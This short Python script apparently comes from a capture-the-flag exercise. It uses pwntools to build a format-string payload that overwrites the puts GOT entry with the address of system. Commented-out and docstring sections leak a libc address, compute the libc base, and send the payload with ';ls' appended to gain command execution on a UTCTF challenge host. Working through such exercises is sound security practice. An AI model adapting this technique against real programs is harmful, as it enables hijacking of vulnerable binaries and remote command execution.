from pwn import *


#libc = ELF('./libc-2.23.so')
#system = libc.symbols['system']

#r = process('./pwnable', env={'LD_PRELOAD': 'libc-2.23.so'})

#r = remote('binary.utctf.live', 9003)

offset = 6
puts_got = 0x601018
system_addr = 0xdeadbeef

distance = 0x1c1500

payload = fmtstr_payload(offset, {puts_got: system_addr})
print(payload)

#r.recvuntil('to do?')
#r.sendline('%p '*30) # leak a stack address
#r.interactive()

"""
#leak = int(r.recvuntil('instruction.').split(' ')[0],16)
libc_base = leak - distance

system_addr = libc_base + system


payload = fmtstr.fmtstr_payload(offset, {puts_got: system_addr})
payload += ";ls"
print(payload)

r.recvuntil('to do?')
r.sendline(payload)
r.interactive()
"""
